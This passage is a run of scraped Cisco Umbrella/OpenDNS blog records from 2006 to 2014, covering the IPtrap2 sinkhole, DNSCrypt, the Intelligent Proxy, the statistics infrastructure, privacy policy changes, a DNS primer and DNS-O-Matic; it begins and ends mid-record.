|| destination-ip || source-port || destination-port || uts - 64) If the acknowledgment number (S0 + 1) sent by the client doesn’t match t2 either, the packet is ignored. This is a common technique to mitigate some denial-of-service attacks ( SYN Cookies ). If (Ss0 + 1) matches t1 or t2 , the metadata and the payload are sent to a ZeroMQ socket for further inspection (see below), and a packet acknowledging the client data and closing the connection (ACK/RST) is sent as a response. Note that we never ever have to keep a state. Using a keyed hash function let us verify acknowledgment numbers sent by clients without having to keep track of what sequence numbers were initially sent to them. As a result, memory usage is constant and no lookups are required, no matter how many clients are simultaneously connected or connecting. Full-featured TCP/IP stack are way more complicated. In particular, IPtrap2 doesn’t deal with fragmentation. However, its simplicity makes it fast, scalable, and a relief for system operators since it is isolated from the kernel network stack, and no kernel tuning is required. Processing the output Because it is decoding raw ethernet frames, IPtrap2 doesn’t “listen” to a specific set of TCP ports. It actually captures any TCP packet, on any port. Obviously, none of these can be used for amplification attacks, as the server negotiates connections but never sent any payloads. The output of nmap scanning the sinkhole is thus quite unusual . Only the first packet containing a payload is accepted, and the connection is dropped immediately after. This initial packet is all we need for our research. It is enough to have an idea of what protocol is being used, and get a path in addition to a domain name hosting a HTTP service. Sinkholed data is primarily meant to be processed by real time classifiers. This is why the output of IPtrap2 is also a ZeroMQ stream, allowing multiple models to simultaneously process the same data. Packets are currently encoded as JSON objects, soon to be replaced by Cap’n Proto in order to handle binary payloads better and faster . The OpenDNS sinkhole is a welcome addition to our toolbox in order to keep blocking malware as soon as possible while still having a very low number of false positives.", "date": "2014-02-28"},
{"website": "Cisco-Umbrella", "title": "Automating Umbrella Using Kaseya", "author": ["Dima Kumets"], "link": "https://umbrella.cisco.com/blog/automating-umbrella-using-kaseya", "abstract": "As a product manager, conferences are incredible opportunities to talk to customers and partners face-to-face. This year’s Kaseya Connect certainly delivered, as hundreds of our Managed Service Provider (MSP) partners descended on Las Vegas to learn, network, and party a little with their peers. I expected to come back with great ideas, real world feedback, and feature requests from our partners. I did not anticipate what happened next: Damian Stalls from Fluid Networks came to the OpenDNS booth to meet the team and told us about the Kaseya automated deployment and monitoring scripts he had built for Umbrella. I was thrilled when Damian offered to talk after the conference and share his automations with the community. Fluid Networks is an MSP headquartered in Southern California with a national customer base. They deploy Umbrella to every managed service customer as a standardized process. Damian describes Umbrella as “ a critical layer of assured security for us and our clients. We deploy it for all customers and don’t charge extra for it. Deploying Umbrella is important to ensure that our customers are protected and to free us up from having to waste time on remediating malware.”  Damian added that he has been tracking threats like CryptoLocker but “none of our customers were encrypted and that’s one great proof point of its value.” Damian also talked about the importance of automation to their business and to their customers. “Our goal is to be as automated as possible. We have a standing order for the team: If you have to do the same thing 3 or more times manually, raise your hand and get it automated. The last thing we want is our engineers wasting time doing something manually while our customers are waiting for something to get fixed.”  This focus on automation not only helps make an MSP more efficient, but also improves customer satisfaction. Since coming back from Kaseya Connect, Damian has posted his script along with SQL changes and instructions on Kaseya’s knowledge exchange.  Besides deploying the Umbrella Roaming Agent, the script adds monitoring and automated tests to verify that customers are being protected.   The script automatically runs the Umbrella diagnostic tool in the background and parses the results to verify that the agent is running and applying policy. In the rare event that it does encounter an issue, the script will automatically re-deploy the agent using customer specific parameters stored in Kaseya and test again. Furthermore, if a customer adds a new managed end-point, the script will automatically deploy the Umbrella agent to ensure consistent protection. The success or failure of the automations create tickets to help an MSP track automations performed and be alerted of any issues.  Damian also included instructions on how to set up monitors for the roaming agent. Take a look at Damian’s automations here . Have your own RMM automations for Umbrella? We’d love to hear from you!  Leave a comment below.", "date": "2014-04-30"},
{"website": "Cisco-Umbrella", "title": "OpenDNS and FireEye: A New Security Partnership", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/opendns-fireeye-security-partnership", "abstract": "When it comes to protecting a single location or network perimeter, appliance-based solutions seem to rule the day. While typically expensive, their ability to detect and enforce is second to none when protecting a single internet egress point. However, this approach is challenged when trying to extend protection to distributed networks, remote locations or employees constantly on the move. But never fear, there is a solution! OpenDNS recently partnered with FireEye, the leader in APT detection and behavioral analysis, to integrate Umbrella with the FireEye Web Malware Protection System (MPS). The integration of these two security offerings represents a turning point in traditional perimeter-based security; any MPS appliance can now direct its intelligence to Umbrella to extend its layer of protection to hard-to-reach locations or roaming devices. In addition to extending protection off network via our cloud-based solution, we’ve also made enabling the integration incredibly simple. While the majority of security solutions in today’s market can take significant time or professional resources to deploy, this integration allows you to extend protection in as little as 5 minutes. So how does it work? Well, it’s quite simple: By utilising a real time alerting system built into the FireEye appliance, Umbrella is able to act upon any suspicious or known malicious activity at the DNS level as soon as FireEye detects it. This means that Umbrella is able to cover any device with the built in power of Security Graph as well as FireEye’s APT and behavioral analysis, creating a true force multiplier for today’s security buyer. This integration demonstrates the evolution of the traditional security perimeter; where once it was solely confined to the physical limitations of the wired network, we can now shift to the global reach of the cloud. Today’s security buyers no longer have to make the hard choice between which network perimeter or set of roaming devices to protect – they can effectively extend their perimeter of protection anywhere with this integration. Welcome to the new global security perimeter.", "date": "2014-02-05"},
{"website": "Cisco-Umbrella", "title": "Update: Domain tagging categories are getting a facelift.", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/domain-tagging-category-facelift", "abstract": "The world changes fast, and in order for OpenDNS to keep our Web filtering category descriptions as accurate as possible, we regularly evaluate whether the descriptions are still relevant to our user base. Today we’re announcing two Web filtering category updates that should add an essential layer of clarity around which websites belong in two important categories. As with many of the features we deliver, these improvements were motivated by the feedback of both the domain tagging community and our users. Sexuality Category The sexuality category includes websites that, “provide information, images or implications of bondage, sadism, masochism, fetish, beating, body piercing or self-mutilation.” And that won’t change with this update. However, we’ll be updating this category description to explicitly state that the category is not intended for LGBT related sites that do not fall under the aforementioned criteria. What category would an LGBT site fall under? It wouldn’t. We see no reason to create one. Tasteless Category The tasteless category includes websites that, “contain information on such subjects as mutilation, torture, horror, or the grotesque.” The definition will be updated to reflect that this category also includes pro-anorexia and pro-suicide related sites. These types of domains have always been included in this category by our community, but we think updating the definition will provide more clarity for users who wish to specifically block this type of content on their networks. The full descriptions of all Web filtering categories apply to both OpenDNS Parental Controls and the Web filtering available as part of Umbrella security services for businesses. If joining a passionate community and becoming part of these conversations sounds like something that you’re into, then drop us a line!", "date": "2013-06-27"},
{"website": "Cisco-Umbrella", "title": "DNSCrypt for Windows has arrived.", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/dnscrypt-for-windows-has-arrived", "abstract": "In December we delivered a preview of one of the most critical and innovative technologies DNS security has seen. DNSCrypt, available initially only for Mac, works by encrypting all DNS traffic between you and your DNS provider, OpenDNS. That critical path between you and your DNS servers is often referred to as the “last mile.” It’s in this “last mile” that bad things are most likely to happen — snooping, tampering, or even hijacking traffic. Anyone who knows what they’re doing can eavesdrop on your Internet activity and see exactly which domains you are resolving, and in many cases, what websites you’re visiting. Worse, sophisticated attackers can modify responses and redirect you to malicious sites. We have always used various techniques to thwart this, but none as iron-clad as simply encrypting all the communication between you and OpenDNS. The effect of DNSCrypt is immediate and adds significant privacy and security to your Internet connection, particularly when you’re accessing the Internet on a public WiFi network at a place like a coffee shop or airport. Today DNSCrypt is used by more than 10,000 people Today we proudly reveal DNSCrypt for Windows. While we’re mostly a Mac and unix shop here at OpenDNS, we care about protecting all users. Since Windows has more than 80% market share around the world we knew we could not ignore the need for DNSCrypt on Windows. There are a number of reasons why the World needs DNSCrypt, but here are just a few: Today’s Internet users no longer access the Internet only at home or at work. Users connect to several different networks throughout the day. As the DNS and security service powering the most Internet users around the world, we’re focused on inventing solutions that enable security for all the ways that people connect. DNSCrypt is a foundation for something much, much greater. We have disrupted the world with our technology and ideas, and we believe You Ain’t Seen Nothing Yet. Please note that what we’re sharing today is a technology preview. While it’s been tested by OpenDNS engineers and OpenDNS users around the world and the Mac version is today being used by an impressive 10,000+ people, there may still be some bugs. We ask that you give us feedback if you see issues so we can iterate and improve quickly. Those of you who frequent the largest coffee chain in the world will be happy to know we fixed an issue some of you had using DNSCrypt on their Wi-Fi. Without any further delay, download DNSCrypt today and help improve the state of Internet security, one user at a time.", "date": "2012-05-08"},
{"website": "Cisco-Umbrella", "title": "Statistics \"Big Data\" Architecture", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/statistics-team-overview", "abstract": "The OpenDNS Global Network enforces security worldwide through our 21 data centers, handling 50 billion DNS requests per day . This traffic generates around 300 gigabytes of query logs each hour, which contains information crucial to our customers. Analyzing that amount of data, however, is no easy task. The Statistics Team is responsible for building and maintaining the complex architecture that stores and processes the massive amounts of data collected. The platform enables OpenDNS customers to gain insight into the security of their networks and the security team to study malware infection patterns around the world. The Statistics infrastructure is responsible for all reports generated within the Umbrella Dashboard. The process begins with collecting the raw query logs as they come in from all of our DNS resolvers, iOS VPN systems, and proxies. Once the logs are filtered for essential information, they are stored in a Hadoop cluster where different MapReduce algorithms run and generate key statistics. Utilizing Hadoop and MapReduce enables a huge dataset to be processed much faster by breaking it into many subsets, processing each subset individually, and then combining the results of each subset. The statistics are then stored in an HBase distributed database for our customers to quickly access. One large cluster is used for processing all query logs to generate report data, which syncs with a backup cluster to keep an active copy as a failsafe. A special cluster was built for the Security Research team, which gives them a sandbox to experiment with new algorithms against real-time data and stay current with the latest types of attacks. Overview of Statistics Systems Some recent projects completed by the Statistics Team include real-time analytics and the backend system for our recently renamed Investigate product. Our customers need to see activity within their network as it happens, and waiting for data to be processed doesn’t make that possible. Since it can take up to 40 minutes for all the MapReduce jobs to run, a separate Kafka and Storm cluster was built to enable searching for DNS logs in real time. The OpenDNS Investigate product was initially developed as an internal research tool, but it quickly became evident how valuable it would be to our customers. The Statistics Team took on the task of transferring and scaling a system initially built on a small development box and making it able to handle millions of queries. The Statistics Team consists mostly of software engineers, but is rounded out with a product manager and several technical support, infrastructure, and front-end engineers. This diversity of roles allows other teams to function without worrying about accurately presenting data. It also gives the Statistics Team the capability to pursue projects of our own. As our 50 million daily users continue to use OpenDNS to safely connect to the Internet, the Statistics Team will be working behind the scenes to process and analyze all of the data that is being generated.", "date": "2014-05-16"},
{"website": "Cisco-Umbrella", "title": "Proxy as a Platform", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/proxy-platform", "abstract": "Just because our name is OpenDNS it doesn’t mean that we are solely focused on the DNS protocol. Being a DNS provider has a lot of advantages; It offers a bird’s eye view of connectivity across our entire customer base, allows us to use that data to benefit everybody,  and it’s a simple way to inspect traffic from any device, anywhere, and at any time. However, high quality security requires information beyond domain names alone. This is where the OpenDNS Intelligent Proxy comes in. We call it the “intelligent proxy” because unlike other proxy based solutions, we don’t have to proxy absolutely everything to catch suspicious activity. Whenever we see a DNS query to a questionable domain, perhaps one that we don’t want to completely allow or block, we direct the request to a proxy. By doing this, we can dive deeper into the transaction and make a more informed decision on whether it is safe or potentially dangerous. Inspecting traffic A key feature, which lends itself to the success of the proxy, is its speed. The overhead is less than 200ms per query. This is because our fleet of proxies is spread a across  our data centers worldwide – with plans for additional areas in the near-term. In addition, we only perform deep inspection of suspicious domains that meet certain criteria. Everything else goes straight to the internet. A query for a safe site (seen below) will return the original address: But a query for a questionable one (see below) will return an IP of one of the proxies: Monitoring Stats A granular understanding of how our global proxies operate is very important. The things we monitor are important not just for traffic patterns, anomalies, latency, and performance, but also serve as an important source of data for our research team. Cross referencing performance parameters like requests per second or bytes per second with security parameters such as DNS query results, the number of blocked requests, and changes to our suspicious list of URLs/domains serve many purposes. Among them are: Detecting malware outbreaks, which often involve a spike in the number of blocked requests from a specific destination. Detecting DoS attacks, which are characterized by a general spike in traffic, usually from one or few sources. Noticing when something is not right on our end, like a false positive entry in the suspicious URL list that creates an increase in proxy activity without a legitimate reason. Thanks to our monitoring systems, we can react fast and optimize our customers browsing experience before they even notice that an incident is taking place. Similar to security updates, each server in the fleet is responsible for pushing its own statistics to a centralized database. We use tools built in-house to visualize the data as well as open source projects such as Graphite and Nagios to alert whenever anomalies are detected. Examples of these visualizations are shown below. A platform for growth At the time of this blog post we are mostly looking at HTTP traffic, but we have big plans for the Intelligent Proxy. From the beginning we have been building this architecture to support more protocols and inspect the data using a variety of techniques in parallel. Our team is constantly coming up with new ideas to leverage data from the billions of DNS queries we serve daily, as well as looking for innovative partners to collaborate with. As you can see, the OpenDNS Proxy is actually a platform. It provides multiple layers of inspection without impacting the end user experience or configuration. We can easily scale up and add servers if the need arises. We are very excited to work on this project and plan on providing many exciting new features in the upcoming months. Stay tuned…", "date": "2014-05-01"},
{"website": "Cisco-Umbrella", "title": "A better privacy policy", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/a-better-privacy-policy", "abstract": "Writing a Privacy Policy is hard work. A part of me would love to just have a Privacy Policy that says, “We won’t do anything stupid” — Just like I’d love a Terms of Service that says “Don’t do anything stupid.” Unfortunately, the lawyers and the laws of many countries won’t let us get away with that, so the next best thing is to have a Privacy Policy that is clear, specific, and easy to read. With that in mind, we’ve updated our Privacy Policy to be much more specific about what we do and what we do not do with data supplied by our customers. The new policy is a big improvement from our current policy and I think it goes a long way in clarifying to our users what happens with their data. Like our always-improving service, our Privacy Policy is a living document that will continue to be updated over the years to more accurately reflect the business we are in and to respond to the important privacy concerns of the day. Here are some of the important changes in the document: We are switching over to a new stats collection system (hadoop-based) and so we are now storing raw DNS logs for longer periods of time. The time we store them now is variable (based on disk space) but right now is about a month. Since it’s likely to change over time, we are now clear in communicating that we retain data like this for a longer period of time. We’ve updated the language to clarify that using the OpenDNS service does provide us with personally identifiable information, since it provides us with your IP address, which is considered personally identifiable information. We added explicit language to communicate that we do not share, sell or rent access to our customer DNS queries. The obvious exceptions are when we need to share data in order to provide a service you have asked for or that we require to run our service, or when we have to satisfy a legal mandate. But nobody can come to us and purchase a raw feed of the customer DNS traffic, we just aren’t interested in that business. Separate from the DNS queries, OpenDNS works with vendors and partners to provide services to us (i.e. network monitoring software, email newsletter management) and to you (i.e. malware researchers). To perform these services we sometimes need to share specific pieces of personal information with them. We’ve clarified when we do this and have explained that all are doing so at our request and are limited in their scope. You should read and understand our new Privacy Policy, as I’ve only summarized pieces of it above. Here’s a link to our new Privacy Policy . The new policy is effective beginning today. I hope that this new policy better clarifies how we protect and respect your data as you use our service. If you have questions you can always contact your account manager or our customer support team.", "date": "2011-04-13"},
{"website": "Cisco-Umbrella", "title": "5 Recommendations for Security Without Baggage", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/5-recommendations-security-without-baggage", "abstract": "Baggage is often an emotionally-charged word. It can refer to the reason you have to pay exorbitant fees while travelling, or that ex that you had to cut ties with before they went fatal attraction on you. So applying the term “baggage” to Internet security may seem strange, but when it comes to trying to protect your users from all of the nasty bits on the big bad Internet, there is definitely a lot of baggage associated with the current deployment models and approaches offered by legacy security vendors. The IT world is rapidly evolving from castles and moats into clouds and dissolving perimeters, and as such organizations have to re-think how to secure their users and their all-important data. These trends have also afforded legacy network security companies the opportunity to unapologetically chant “We’re doing it all wrong! Let’s get it right this time!”, while in the next breath explaining how their existing products are leveraging the cloud and everything will be different this time. But when the rubber meets the road, the baggage is still there. So here are a few recommendations that we think are useful to consider when thinking about how to evolve your approach to security in the coming months and years. #1: Don’t get in the way of your users You shouldn’t have to trade off performance or ban access to new technology to protect your users. For starters, let’s acknowledge that job #1 is to enable your users to get their jobs done without creating undue risk for your organization, and part of that means allowing them to leverage some of the amazing new services and technologies that are emerging to gain an advantage over the competitors in your industry. Some examples of trade-offs that get in the way of users include: Requiring your users to VPN back into the office network The value here is being marginalized as your data and mission-critical services continue to slip out the back door and into the cloud. And that doesn’t even account for the fact that most of your users likely aren’t doing this reliably anyways, and are thus exposed whenever they leave your network. Heavyweight scanning that slows your users down This trade off is one that frustrates users to no end, whether it’s occurring via an endpoint agent or because all traffic is being pushed through proxies. The baggage you want to shed here is the idea that you can’t deliver excellent security without imposing a performance, manageability, or convenience tax on your users. And even if you’re making it work today without such taxes, you might still be seriously neutering those users from leveraging new technology to enable your business. At OpenDNS, our focus is to build products that have zero end-user impact, and can even improve their Internet experience. We do that by depending on our extremely lightweight but effective DNS-based layer, and our resilient global network. #2. A lightweight, contextual approach goes a long way You don’t need to inspect every transaction in the same heavyweight way to deliver excellent security. Despite the fact that ~98% of your organization’s traffic will be allowed, all Web security products require you to inspect every single connection, in exactly the same way. This imposes complexity and creates performance and scalability issues in scenarios where: a) it’s very unlikely that threats will traverse, and b) your security vendor is likely to miss if it’s a zero-day attack on a generally trusted cloud service. The baggage you want to shed here is the idea that you must push all of your traffic through a security solution always in the same way with the same depth, or else your approach to security is flawed. At OpenDNS, we have always found it counter-intuitive that the lightest-weight approach to security is one that’s largely been ignored. Obviously, here we’re talking about DNS. With OpenDNS’ Umbrella product, we enforce responsive security by using DNS as the first opportunity to make a decision to block, inspect further, or allow based on our unique macro view of the threat landscape. We believe that we need to use our threat intelligence to make informed decisions on which connections warrant deeper inspection and which connections can be trusted, and only use heavyweight analysis if our intelligence indicates it’s necessary. #3. Protect your users ALL of the time Protection shouldn’t disappear when your users go outside your castle walls. Even Ron Burgundy knows that it doesn’t make sense if something “works 60% of the time, every time”. In today’s enterprises, it’s normal to have a large population of users that take their laptops (and obviously, their mobile devices) outside your network. They’re often expected to VPN back into the network to avoid being exposed in coffee shops or airport wifi networks, but much of the time they don’t bother. Those who are thinking, “my users have Macs so they aren’t exposed,” are kidding themselves. Commodity attackers are often focused on stealing credentials used to access services like SalesForce and Google Apps. With no protection against those types of threats, your users are exposed when they leave the confines of your well-protected network. The baggage you want to shed here is the idea that hardware-based security solutions provide you the protection you need. Your network is de-centralizing along with your data and your users, and to really protect them all of the time, you need a cloud-based security solution. At OpenDNS our mantra is to “Enable the world to connect with confidence on any device, anywhere, anytime.” Umbrella allows organizations to easily deploy lightweight protection across their distributed network that fulfills this vision and doesn’t compromise their security depending on where their users happen to be working. #4. Don’t invade your user’s privacy Your approach to security shouldn’t compromise the trust between you and your users. Users are taking their work laptops with them…everywhere. Whether they’re bringing them home, to a coffee shop, or on business trips, they want to be able to take care of personal business on those laptops as well as getting work done. As a security professional, do you really care if they’re watching YouTube videos or browsing Facebook from home on a work laptop? The baggage you want to shed here is the use of security solutions that apply the same heavyweight policies without any sense of context. For instance, applying the same content filtering policy regardless of whether users are in the office or at home can suffocate your users and breed distrust between you and them. At OpenDNS we’re working on new ways to transparently inspect traffic beyond DNS, like HTTP/S and other ports and protocols. Our approach is to to use privacy-sensitive defaults and apply rigorous security all of the time, but allow you to relax content filtering logging and policies when your users are outside the network. Taking this approach helps you become a partner, instead of an adversary to your users; the protective big brother instead of George Orwell’s version, which is much more palatable for your users. #5: Don’t try to solve people problems with blunt instruments Focus on excellent security instead of trying to solve easily circumvented productivity issues. Is it really worth it to worry about the time your users spend on Facebook and blocking or limiting when they can access it? More and more this is a losing battle because your users all have phones, tablets, and phablets (oh my!) that allow them to do whatever they want over their 3G or LTE connection. The baggage you want to shed here is the idea that you want to expend a lot of time and money on technical solutions to productivity problems. These are people problems and those users need to be managed & incentivized to do their job well – something that can’t be solved with the click of a button. At OpenDNS our goal is to deliver excellent security and good enough content filtering for you to be able to do your due diligence in preventing your users from accessing inappropriate content while in your work environment. Conclusion Some of the above five points may be difficult for you today, but keep them in mind as you develop your internet security strategy moving forward. You might also give Cisco Umbrella a try and find that you’ve taken your first step down a path towards delivering security that works with the way the world works today, and enabling your business instead of hampering it. It’s time to start shedding all that unnecessary baggage!", "date": "2014-04-10"},
{"website": "Cisco-Umbrella", "title": "Speed, Security, and Safety Through DNS", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/speed-security-safety-dns", "abstract": "The Domain Name System, or DNS, serves as the core of all work at OpenDNS. It lets us connect 50 million people a day to the Internet with our free home DNS service, predict malware outbreaks in the OpenDNS Security Labs, and provide scalable security enforcement and threat protection with Umbrella. How does an Internet protocol invented 30 years ago serve so many purposes? In this post, I’ll be taking an in-depth look at DNS – what it is, what makes it work, and how we use it to safely connect people to the Internet anywhere and anytime. What is DNS? DNS is the address book of the Internet. Computers identify themselves with an “Internet Protocol Address,” or an IP address. When you connect to websites, they also have an IP address. For example, the IP of the OpenDNS website is 67.215.92.219. When you connect to this site, the address bar on your browser doesn’t show 67.215.92.219 – it shows blog.opendns.com – but if you type our IP address into your address bar, you still get to our website! In that example, blog.opendns.com and opendns.com are domain names. They were invented by early Internet researchers so that they could avoid remembering long IP addresses – instead, they created more human-friendly names, like opendns.com. When you type opendns.com, you still connect to our server. This is because your computer looks up opendns.com to find the IP address that it connects to. Your computer initiates about a thousand DNS queries every single day – websites, software updates, and even phone apps rely on the service. There are too many sites on the Internet for each computer to keep a complete list, so DNS servers act as an address book when computers look up domains. That’s the basic premise of DNS – when you want to connect to a website or other application server, it tells your computer which address to connect to. Whose DNS am I using? There are tens of thousands of recursive and authoritative DNS servers in the world. If you have never tinkered with DNS in the past, you probably use the recursive DNS servers of whoever provides your Internet. At your house, this may be a cable company. On your phone, it is your cellular provider. At the coffee shop down the street, it’s their Internet Service Provider. Not all DNS services are created equally. If the recursive DNS service you use breaks, you cannot connect to websites. If the DNS service you use is slow, then your connection to websites will be slow. If your DNS servers are not up-to-date, then you may not be able to connect correctly to websites. OpenDNS started its DNS service to provide everybody with the most reliable, safest, smartest, and fastest Internet connectivity in the world. If you want to take control of your DNS, learn how to set up OpenDNS on your devices . You can always check whether you are using OpenDNS by visiting welcome.opendns.com . How can DNS be used to find malware? With 50 billion DNS lookups going through the OpenDNS Global Network every day, we have a window into the Internet. In our mission to connect the world with confidence, we formed OpenDNS Security Labs to predict emerging threats by analyzing how attackers leverage criminal infrastructures on the Internet to launch attacks. Our Security Labs team has access to all the data our global network acquires, and they use it to examine how the whole Internet works and changes. Bad things like malware, spyware, phishing, and other scams rely on DNS, so we utilize the power of Big Data to search for, identify or even predict these malicious domains. The results of the research can be pretty beautiful. With machine-learning systems, the OpenDNS Security Labs can predict the behavior of malware and botnets before attacks happen. The result of this data and research is a product called the OpenDNS Security Graph. It’s basically a contextual search engine for the infrastructure of the Internet. Searching for domains, IP addresses, or other routing protocols shows the OpenDNS Security Labs prediction of whether a site is good or bad. How can DNS stop me from connecting to malware? By combining DNS and Security Graph, OpenDNS released Umbrella – a full security enforcement solution in the cloud. Umbrella makes the “address book” of DNS smarter–when Umbrella customers look up a domain like opendns.com, our DNS servers add in one extra step. The DNS service checks where you want to go in Security Graph – in this example, opendns.com – to see if the domain and the address you want are both safe. If they are, the service gives you the correct address, and your Internet browsing continues with the same speed as normal DNS. However, if Security Graph has flagged the domain or the address as malicious, Umbrella stops you from connecting by redirecting you to a block page indicating that the site is unsafe. Umbrella takes the address book of the Internet and cuts out the bad parts so that your computer cannot even find the addresses of harmful servers. The best part about Umbrella is that it is built into the OpenDNS Global Network, with data centers around the world. You do not have to install anything – setting up Umbrella for your business can be as easy as setting up the OpenDNS home service. What is the future of DNS-based security? Some websites on the Internet are good, but host bad things. For example, file-sharing websites or blog services are sometimes misused for malicious activities. To address this, Umbrella now offers the Intelligent Proxy. Proxying works like a guarded door–it lets most things through, but if the guard sees something bad coming, it shuts the door to protect you. With the Intelligent Proxy, when your computer makes a DNS query for a site that sometimes hosts bad content, the Intelligent Proxy kicks in to protect you. Instead of returning the correct address of the website, the DNS server returns the address of the Intelligent Proxy, where OpenDNS security software can take a deeper look at everything. While browsing the Internet, you will never realize that this extra level of security is protecting you–your computer thinks the address of Intelligent Proxy is the website it wants, so it behaves normally. Conclusion DNS makes the Internet work. After reading this primer, you should have a better idea of how that’s accomplished, and how that technology can be applied to security. Although we rarely think about it, this quiet protocol controls our access to the Internet, making it important in our everday security. OpenDNS has been delivering reliable and safe DNS to millions of people around the world for seven years, with zero downtime, which is almost as incredible as DNS itself. So if you’d like to be part of the OpenDNS family, simply click this link to get started!", "date": "2013-12-11"},
{"website": "Cisco-Umbrella", "title": "OpenDNS.com: now reachable over IPv6", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-world-ipv6-day", "abstract": "It’s still Tuesday, June 7 here at OpenDNS headquarters in San Francisco, but in lots of places around the world it’s already June 8, World IPv6 Day . That means for the next 24 hours OpenDNS.com and hundreds of other websites are officially reachable on IPv6. We’re big fans of World IPv6 Day, both in concept and in practice. Spearheaded by The Internet Society , it’s a 24-hour test flight where organizations around the world – ISPs and technology companies like OpenDNS – are encouraged to offer their content over IPv6. Without such a broad-reaching and compelling reason to invest the resources to make it happen, lots of companies would have continued putting it off. And we’re in excellent company in our participation in World IPv6 Day: Facebook.com, Google.com and Yahoo.com have joined the effort, as well. In addition to participating by upgrading our website, we went a step further helping to prepare your network for the transition to IPv6. To make your life easier we built a free, fully IPv6-compliant DNS sandbox for you to use to test without consequence before you move everything over. Happy World IPv6 Day and Happy (IPv6) Hacking!", "date": "2011-06-07"},
{"website": "Cisco-Umbrella", "title": "Visualize your DNS with the OpenDNS Dashboard", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-dashboard-launch", "abstract": "Our users tell us they want power and intelligence. Or rather, our users want intelligence about their network and the power to make changes. Today we’re taking it up a notch, turning your OpenDNS Account into a comprehensive Dashboard which gives you a more precise understanding of your DNS traffic. The ability to gain insight into your DNS traffic and then have the tools to act without needing to install any software or buy any appliances is a huge win that every IT administrator in the world will enjoy. On top of that, it’s completely free. Until today, we had a rudimentary (and rickety by our standards) stats system that would show you only a birds-eye view of your data. For instance, you could view a top-line number of total DNS requests and your top 10 domains per day. If you wanted to know the 11th domain, you were out of luck. Want to know how many DNS requests you are doing each day? Want to know what your top domains are? Want to block sites easily all in an intuitive interface? Done, done and done. Now, you can get the count of every domain looked up on your network, over any period of time. View the data as a chart, a table or drop a CSV file into Excel. This is your data. I like to think that the OpenDNS Dashboard is like Google Analytics for your DNS . In the coming days and weeks you will see the Dashboard grow in functionality as we offer more ways to interpret your data. For those concerned about any privacy implications related to this new launch, I’d encourage you to read our post . Learn how we’re now storing less data about our users than ever before and giving you full control over what data we keep. Thanks to our new Dashboard, OpenDNS is the rock solid, reliable DNS that is safer, faster, smarter and now gives you near-real-time statistics and trends about what’s happening with your network. Let us know what you think!", "date": "2007-07-23"},
{"website": "Cisco-Umbrella", "title": "More instructions for changing your DNS settings", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/instructions-for-setting-dns", "abstract": "When we launched three weeks ago, we had a reasonable cross-section of instructions for some of the most popular routers and operating systems. We knew, of course, that there are many, many different devices and scenarios, and we’d have to keep updating our instructions to match the real world. Our customers couldn’t wait for us (good!). My thanks for these instructions go to individual customers. Buffalo AirStation are courtesy of Zach Marshall. Windows Vista (Beta) are courtesy of Colton Hilliard. SpeedStream 5200 are courtesy of Luis Serrano. IPCop (Linux firewall application) are courtesy of James Truesdale. BIND9 forwarding instructions (in our FAQ) are courtesy of an early customer (apologies for not remembering whom!) We’re adding more ourselves, of course, like Windows 98. I’m not ashamed to continue asking for help, whether corrections or new screenshots and instructions. We’re quite happy to take raw materials and clean them up (add our orange highlights, spell-check, etc.) to help get the word out to others who might have the same equipment or situation. Email us your instructions and screenshots: contact at opendns dot com . All the credit will be yours! Additional information about static IP addresses We’re learning, to our dismay, that some routers will only let their owners set DNS servers if the owner has a static IP address. Most folks connecting from home (i.e., those who would use the router instructions) have a dynamic IP address. One example, which was confirmed today to a customer by Motorola customer support is the Motorola WR850 wireless broadband router. Both models, the GP and G, only allow DNS settings to be changed for static IP addresses. Frustrating, but good to know. Earlier, we learned that the Linksys WRT54GC Compact Wireless-G Broadband Router has the same limitations. Fortunately, most people can simply use the operating system instructions, and the settings “closest to the customer” are the dominant ones, corporate networks excluded. All of this information will make its way into the Get Started pages as we learn more.", "date": "2006-07-31"},
{"website": "Cisco-Umbrella", "title": "Update the world with DNS-O-Matic", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/announcing-dns-o-matic", "abstract": "Today I’m pleased to introduce a new, free service which makes the Internet easier to use for the hundreds of millions of people with a dynamic IP address: DNS-O-Matic . DNS-O-Matic gives you a free and easy way to announce your dynamic IP changes to multiple services with a single update. No idea what I’m talking about? Well here’s the super-abridged version: Your computer has something called an IP address associated with it that is unique on the Internet, a lot like a phone number is unique. IP addresses are how computers reach each other, just like we use phone numbers to reach our friends on the phone. Unfortunately, unlike phone numbers, most residential ISPs (Comcast, AT&T, Verizon, etc.) give you a dynamic IP address instead of one that is static (stays the same). Whenever your IP changes, it can make it hard for certain network services to figure out how to reach you. DNS-O-Matic fixes that. DNS-O-Matic solves this problem in a very general way that provides immense benefits to network service providers (like OpenDNS), software developers and, of course, users like yourselves. A lot of small businesses and remote offices have dynamic IPs: DNS-O-Matic is for you, too. Most importantly, it’s completely free for all parties involved. Solving a troublespot for OpenDNS customers OpenDNS offers a lot of benefits on top of our free, fast, reliable DNS service. All of these benefits are tied to your current IP address. For those with static, unchanging IP addresses, this has always been simple. For dynamic IP addresses (the majority of home users), this requirement has meant an extra step: installing or configuring software to send updates when your IP changes . It’s never been as easy as we want. Some of our more technical OpenDNS customers who use dynamic DNS hostnames asked for a way to use that hostname to track their changing IP. We took a wider view and came up with a scalable solution that helps our users, and is available to any company who needs to solve this problem. Creating a broader opportunity for the industry Like we did with PhishTank , OpenDNS is solving an industry-wide problem with a scalable and open solution. DNS-O-Matic works because everyone involved in the Dynamic IP process benefits: First : Every one of the hundreds of millions of Internet users with a dynamic IP address can now share their dynamic IP changes with all the services they care about in one update. One IP update will be redistributed to every service you subscribe to. New services are automatically supported without requiring you to download anything or buy a new device. Second : Developers of dynamic IP update software can support multiple services — current and future — by supporting a single, free API . One of the reasons that hardware vendors only support one or two Dynamic DNS services is that it’s hard to add support for each and every one in their hardware device. Now they only need to support one 